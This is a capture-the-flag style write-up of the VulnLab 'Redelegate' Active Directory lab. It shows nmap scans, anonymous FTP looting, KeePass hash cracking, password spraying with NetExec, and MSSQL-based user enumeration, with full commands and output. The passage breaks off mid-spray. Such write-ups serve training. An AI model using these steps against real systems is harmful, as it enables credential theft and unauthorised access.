---
title: "Redelegate — VulnLab | ForceChangePassword, GenericAll, and Constrained Delegation"
description: "And here we go again. Maverick emerges from the shadows once more, bringing you another real-world, hardcore Active Directory machine. This one’s packed with all the good stuff DACL abuse, constrained"
pubDate: 2025-03-11
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 24
coverImage: "https://cdn-images-1.medium.com/max/800/1*kHDu6muYg9isCl629MCu8A.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*kHDu6muYg9isCl629MCu8A.png)

### Redelegate VulnLab | ForceChangePassword, GenericAll, and Constrained Delegation

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*ii7fYB5CtLDTRtCa.jpeg)

*Free Palestine with every single drop of my blood*

---

And here we go again. Maverick emerges from the shadows once more, bringing you another real-world, hardcore Active Directory machine. This one’s packed with all the good stuff DACL abuse, constrained delegation, and a little game of cat and mouse with MSSQL. Buckle up, because this isn’t just another challenge it’s a brutal, mind-bending journey. You ready for the ride?

![](https://cdn-images-1.medium.com/max/800/0*2eN-Hn6pIlG_bWU4.gif)

#### Lurking in the Shadows — Scanning Phase

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate/nmap_results]  
└─# cat nmap_initial.txt  
# Nmap 7.94SVN scan initiated Fri Mar 7 19:03:42 2025 as: nmap -p- --min-rate 10000 -Pn -oN nmap_results/nmap_initial.txt 10.10.87.74  
Warning: 10.10.87.74 giving up on port because retransmission cap hit (10).  
Nmap scan report for 10.10.87.74  
Host is up (0.083s latency).  
Not shown: 57708 closed tcp ports (reset), 7801 filtered tcp ports (no-response)  
PORT STATE SERVICE  
21/tcp open ftp  
53/tcp open domain  
88/tcp open kerberos-sec  
135/tcp open msrpc  
139/tcp open netbios-ssn  
389/tcp open ldap  
445/tcp open microsoft-ds  
464/tcp open kpasswd5  
593/tcp open http-rpc-epmap  
636/tcp open ldapssl  
3268/tcp open globalcatLDAP  
3269/tcp open globalcatLDAPssl  
3389/tcp open ms-wbt-server  
5357/tcp open wsdapi  
5985/tcp open wsman  
47001/tcp open winrm  
49664/tcp open unknown  
49665/tcp open unknown  
49666/tcp open unknown  
49667/tcp open unknown  
49669/tcp open unknown  
49670/tcp open unknown  
49672/tcp open unknown  
54825/tcp open unknown  
54830/tcp open unknown  
54839/tcp open unknown  
  
# Nmap done at Fri Mar 7 19:04:21 2025 -- 1 IP address (1 host up) scanned in 39.13 seconds  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate/nmap_results]  
└─# cat nmap_detailed.txt  
# Nmap 7.94SVN scan initiated Fri Mar 7 19:04:22 2025 as: nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,3389,5357,5985,47001,49664,49665,49666,49667,49669,49670,49672,54825,54830,54839 -sCV -Pn -oN nmap_results/nmap_detailed.txt 10.10.87.74  
Nmap scan report for 10.10.87.74  
Host is up (0.087s latency).  
  
PORT STATE SERVICE VERSION  
21/tcp open ftp Microsoft ftpd  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| 10-20-24 12:11AM 434 CyberAudit.txt  
| 10-20-24 04:14AM 2622 Shared.kdbx  
|_10-20-24 12:26AM 580 TrainingAgenda.txt  
| ftp-syst:  
|_ SYST: Windows_NT  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-07 17:04:57Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open tcpwrapped  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)  
3269/tcp open tcpwrapped  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-03-07T17:06:03+00:00; +28s from scanner time.  
| rdp-ntlm-info:  
| Target_Name: REDELEGATE  
| NetBIOS_Domain_Name: REDELEGATE  
| NetBIOS_Computer_Name: DC  
| DNS_Domain_Name: redelegate.vl  
| DNS_Computer_Name: dc.redelegate.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-03-07T17:05:56+00:00  
| ssl-cert: Subject: commonName=dc.redelegate.vl  
| Not valid before: 2024-10-30T13:31:09  
|_Not valid after: 2025-05-01T13:31:09  
5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Service Unavailable  
|_http-server-header: Microsoft-HTTPAPI/2.0  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open msrpc Microsoft Windows RPC  
49665/tcp open msrpc Microsoft Windows RPC  
49666/tcp open msrpc Microsoft Windows RPC  
49667/tcp open msrpc Microsoft Windows RPC  
49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
49670/tcp open msrpc Microsoft Windows RPC  
49672/tcp open msrpc Microsoft Windows RPC  
54825/tcp open msrpc Microsoft Windows RPC  
54830/tcp open msrpc Microsoft Windows RPC  
54839/tcp open msrpc Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2025-03-07T17:05:59  
|_ start_date: N/A  
|_clock-skew: mean: 28s, deviation: 0s, median: 27s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Fri Mar 7 19:05:38 2025 -- 1 IP address (1 host up) scanned in 76.26 seconds
```

As usual, there’s SMB, LDAP, Kerberos, DNS, and RPC just like in most common Active Directory machines. I’m not gonna enumerate every single service or port just the interesting ones first. But if you’re in an actual engagement, you better be going through every single service like your life depends on it. Alright, let’s start with FTP and see what we’ve got.

```bash
root@kali:/home/kali/VulnLab/redelegate# ftp 10.10.122.41  
Connected to 10.10.122.41.  
220 Microsoft FTP Service  
Name (10.10.122.41:kali): anonymous  
331 Anonymous access allowed, send identity (e-mail name) as password.  
Password:  
230 User logged in.  
Remote system type is Windows_NT.  
ftp> ls  
229 Entering Extended Passive Mode (|||65239|)  
125 Data connection already open; Transfer starting.  
10-20-24 01:11AM 434 CyberAudit.txt  
10-20-24 05:14AM 2622 Shared.kdbx  
10-20-24 01:26AM 580 TrainingAgenda.txt  
226 Transfer complete.  
ftp> mget *  
mget CyberAudit.txt [anpqy?]? y  
229 Entering Extended Passive Mode (|||65244|)  
125 Data connection already open; Transfer starting.  
100% |****************************************************************************************************| 434 3.79 MiB/s 00:00 ETA  
226 Transfer complete.  
434 bytes received in 00:00 (1.70 MiB/s)  
mget Shared.kdbx [anpqy?]? y  
229 Entering Extended Passive Mode (|||65245|)  
125 Data connection already open; Transfer starting.  
100% |****************************************************************************************************| 2622 18.21 KiB/s 00:00 ETA  
226 Transfer complete.  
WARNING! 10 bare linefeeds received in ASCII mode.  
File may not have transferred correctly.  
2622 bytes received in 00:00 (18.16 KiB/s)  
mget TrainingAgenda.txt [anpqy?]? y  
229 Entering Extended Passive Mode (|||65246|)  
125 Data connection already open; Transfer starting.  
100% |****************************************************************************************************| 580 7.64 KiB/s 00:00 ETA  
226 Transfer complete.  
580 bytes received in 00:00 (7.63 KiB/s)  
ftp>
```

Like you see, I logged in using anonymous access and found three files: **CyberAudit.txt, TrainingAgenda.txt, and Shared.kdbx**. And if you’re wondering about **.kdbx**, that’s a **KeePass database**. We can transfer the **.kdbx** file, extract its hash, and see what kind of fun we can have with it. Let’s crack this open.

But pay attention here when I first transferred the **.kdbx** file and converted it to a hash using **keepass2john**, the hash wouldn’t crack. What went wrong? Simple. I was trying to crack an **ASCII-corrupted file**. The solution? **Activate binary mode in FTP** before transferring the **Shared.kdbx** file. Once I did that, the hash cracked correctly.

And for the cracking part? I used the **seasons** wordlist, inspired by clues I found in the other files. Always look for hints sometimes, the smallest detail can save you hours of brute-forcing.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# keepass2john Shared.kdbx >hash  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# cat hash  
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# john hash --wordlist=./pass.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (KeePass [SHA256 AES 32/64])  
Cost 1 (iteration count) is 600000 for all loaded hashes  
Cost 2 (version) is 2 for all loaded hashes  
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
♟️♟️♟️♟️♟️ (Shared)  
1g 0:00:00:00 DONE (2025-03-11 00:03) 1.204g/s 6.024p/s 6.024c/s 6.024C/s Spring2024!..Winter2024!  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

With **Shared.kdbx** and the password we just cracked, we can access its contents using the [**kpcli** ](https://kpcli.sourceforge.io/)tool. Time to dig in and see what secrets are hiding inside.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# kpcli  
  
KeePass CLI (kpcli) v3.8.1 is ready for operation.  
Type 'help' for a description of available commands.  
Type 'help <command>' for details on individual commands.  
  
kpcli:/> open ./Shared.kdbx  
Provide the master password: *************************  
kpcli:/> ls  
=== Groups ===  
Shared/  
kpcli:/> cd Shared/  
kpcli:/Shared> ls  
=== Groups ===  
Finance/  
HelpDesk/  
IT/  
kpcli:/Shared> ls *  
/Shared/Finance:  
=== Entries ===  
0. Payrol App  
1. Timesheet Manager  
  
/Shared/HelpDesk:  
=== Entries ===  
2. KeyFob Combination  
  
/Shared/IT:  
=== Entries ===  
3. FS01 Admin  
4. FTP  
5. SQL Guest Access  
6. WEB01  
kpcli:/Shared> show -f  
kpcli:/Shared> show -f 0  
  
Title: Payrol App  
Uname: Payroll  
Pass: REDACTED  
URL:  
Notes:  
  
kpcli:/Shared> show -f 1  
  
Title: Timesheet Manager  
Uname: Timesheet  
Pass: REDACTED  
URL:  
Notes:  
  
kpcli:/Shared> show -f 2  
  
Title: KeyFob Combination  
Uname:  
Pass: 22331144  
URL:  
Notes:  
  
kpcli:/Shared> show -f 3  
  
Title: FS01 Admin  
Uname: Administrator  
Pass: REDACTED  
URL:  
Notes:  
  
kpcli:/Shared> show -f 4  
  
Title: FTP  
Uname: FTPUser  
Pass: REDACTED  
URL:  
Notes: Deprecated  
  
kpcli:/Shared> show -f 5  
  
Title: SQL Guest Access  
Uname: SQLGuest  
Pass: REDACTED  
URL:  
Notes:  
  
kpcli:/Shared> show -f 6  
  
Title: WEB01  
Uname: WordPress Panel  
Pass: REDACTED  
URL:  
Notes:  
  
kpcli:/Shared> show -f 7  
kpcli:/Shared>
```

Like you see, we now have some **usernames** and **passwords**. So, what’s next? Of course, bruh **let’s go spraying**. I created two files: **one for users and one for passwords**, and I even added the **seasons** wordlist in there, though we don’t need it right now. But remember, every time you get a new password, **add it to your password file** — this improves your results when spraying. **Pay attention here** spraying with **NetExec** isn’t the most **OpSec-friendly** way to do it. I’ve mentioned this in previous posts, along with better tools for stealthy password spraying. I **highly recommend** you check out those posts, refine your methodology, and **harden your Active Directory approach**.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc mssql 10.10.122.41 -u users.txt -p pass.txt --local-auth  
MSSQL 10.10.122.41 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
MSSQL 10.10.122.41 1433 DC [-] DC\Payroll:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Payroll'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Timesheet:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Administrator:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'Administrator'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\FTPUser:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\SQLGuest:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\WordPress Panel:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'WordPress Panel'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\:cVkqz4bCM7kJRSNlgx2G (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Payroll:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'Payroll'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Timesheet:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Administrator:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'Administrator'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\FTPUser:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\SQLGuest:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\WordPress Panel:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'WordPress Panel'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\:hMFS4I0Kj8Rcd62vqi5X (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Payroll:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Payroll'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Timesheet:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Administrator:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Administrator'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\FTPUser:Spdv41gg4BlBgSYIW1gF (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\SQLGuest:Spdv41gg4BlBgSYIW1gF (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\WordPress Panel:Spdv41gg4BlBgSYIW1gF (Login failed for user 'WordPress Panel'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\:Spdv41gg4BlBgSYIW1gF (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Payroll:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Payroll'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Timesheet:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Administrator:SguPZBKdRyxWzvXRWy6U (Login failed for user 'Administrator'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\FTPUser:SguPZBKdRyxWzvXRWy6U (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\SQLGuest:SguPZBKdRyxWzvXRWy6U (Login failed for user 'SQLGuest'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\WordPress Panel:SguPZBKdRyxWzvXRWy6U (Login failed for user 'WordPress Panel'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\:SguPZBKdRyxWzvXRWy6U (Login failed for user ''. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Payroll:zDPBpaF4FywlqIv11vii (Login failed for user 'Payroll'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Timesheet:zDPBpaF4FywlqIv11vii (Login failed for user 'Timesheet'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\Administrator:zDPBpaF4FywlqIv11vii (Login failed for user 'Administrator'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [-] DC\FTPUser:zDPBpaF4FywlqIv11vii (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')  
MSSQL 10.10.122.41 1433 DC [+] DC\SQLGuest:♟️♟️♟️
```

And here we go. Like you see, we got the **SQLGuest** user password. Let’s check its validity using **NetExec** and see where this takes us.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc smb 10.10.90.212 -u SQLGuest -p <redacted>  
SMB         10.10.90.212    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
SMB         10.10.90.212    445    DC               [-] redelegate.vl\SQLGuest:<redacted>STATUS_LOGON_FAILURE   
                                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc winrm 10.10.90.212 -u SQLGuest -p <redacted>                                                                                                                                                     
WINRM       10.10.90.212    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.10.90.212    5985   DC               [-] redelegate.vl\SQLGuest:<redacted>  
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc mssql 10.10.90.212 -u SQLGuest -p <redacted> --local-auth   
MSSQL       10.10.90.212    1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)  
MSSQL       10.10.90.212    1433   DC               [+] DC\SQLGuest:♟️♟️
```

![](https://cdn-images-1.medium.com/max/800/0*ZX_iDZFlhPBFXjNp.gif)

Like you see, we have access with **SQLGuest**, but only to **MSSQL**. What do you think now? **Hell yeah — straight to Impacket’s mssqlclient!** Let’s see what kind of magic we can pull off from here.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# impacket-mssqlclient SQLGuest@10.10.122.41  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
Password:  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)  
[!] Press help for extra shell commands  
SQL (SQLGuest guest@master)> enable_xp_cmdshell  
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.  
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.  
ERROR(DC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.  
SQL (SQLGuest guest@master)> 
```

When I tried to enable **xp_cmdshell**, we couldn’t — **we don’t have full permissions** to do that. Hmm… you thinking what I’m thinking?

There’s a **common scenario** when you have access to **mssqlclient** but can’t execute commands directly: **NTLM relay**. We can try to relay the authentication and capture the **NTLM hash** of the user running MSSQL. And if we can **crack that hash**, we might just unlock **PowerShell remoting** and slide in smoothly with **Evil-WinRM**.

Are you ready to see that in action?

![](https://cdn-images-1.medium.com/max/1200/1*-NLUgAm9tzpC-U9Y0e8iSQ.png)

But, but, but… when I threw the hash into **Hashcat**, it got executed, but **no password showed up** unfortunately, a dead end. So, what now?

Well, I remember something interesting from an **IppSec walkthrough** — he did something different. There’s a function in MSSQL called **SUSER_SID**, which returns the **Security Identifier (SID)** for a specified user. Here’s where it gets interesting: **we can convert this SID to hex and then transfer it using a common **[**Python **](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html)**script** to manipulate it further.

This might just be the key to unlocking another attack path — let’s put it to the test.

```bash
SQL (SQLGuest guest@master)> select sys.fn_varbintohexstr(SUSER_SID('redelegate\Administrator'))  
  
----------------------------------------------------------  
0x010500000000000515000000a185deefb22433798d8e847af4010000  
  
SQL (SQLGuest guest@master)>
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# cat sid_convert.py  
def hex_sid_to_string_sid(hex_sid):  
sid_bytes = bytes.fromhex(hex_sid[2:])  
revision = sid_bytes[0]  
sub_auth_count = sid_bytes[1]  
identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')  
sub_authorities = [  
int.from_bytes(sid_bytes[8 + (i * 4):12 + (i * 4)], byteorder='little')  
for i in range(sub_auth_count)  
]  
string_sid = f"S-{revision}-{identifier_authority}"  
for sub_auth in sub_authorities:  
string_sid += f"-{sub_auth}"  
return string_sid  
  
hex_sid = "0x010500000000000515000000a185deefb22433798d8e847a00020000"  
sid = hex_sid_to_string_sid(hex_sid)  
print(sid)
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# python3 ./sid_convert.py  
S-1-5-21-4024337825-2033394866-2055507597-512
```

```bash
SQL (SQLGuest guest@master)> select (SUSER_SNAME(SID_BINARY(N'S-1-5-21-4024337825-2033394866-2055507597-500')))  
  
-----------------------------  
WIN-Q13O908QBPG\Administrator  
  
SQL (SQLGuest guest@master)>  
────────────────────────────────
```

When we run it, **boom** we now see a **lot** of users. Time to gather them up, throw them into our **users file**, and go for another **password spraying round**. Who knows? Maybe this time we’ll land another **valid set of credentials** and push further into the system. Let’s go.

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/redelegate]  
└─# nxc smb 10.10.122.41 -u mssql_newUsers -p pass.txt --continue-on-success  
SMB 10.10.122.41 445 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:cVkqz4bCM7kJRSNlgx2G STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:cVkqz4bCM7kJRSNlgx2G STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:hMFS4I0Kj8Rcd62vqi5X STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:hMFS4I0Kj8Rcd62vqi5X STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:Spdv41gg4BlBgSYIW1gF STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:Spdv41gg4BlBgSYIW1gF STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:SguPZBKdRyxWzvXRWy6U STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:SguPZBKdRyxWzvXRWy6U STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:zDPBpaF4FywlqIv11vii STATUS_ACCOUNT_RESTRICTION  
SMB 10.10.122.41 445 DC [-] redelegate.vl\James.Dinkleberg:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Ryan.Cooper:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\sql_svc:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Christine.Flanders:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Marie.Curie:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Helen.Frost:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Michael.Pontiac:cn4KOEgsHqvKXPjEnSD9 STATUS_LOGON_FAILURE  
SMB 10.10.122.41 445 DC [-] redelegate.vl\Mallory.Roberts:cn4KOEgsHqvKXPjEnSD9 STATUS_ACCOUNT_RESTRICTION  
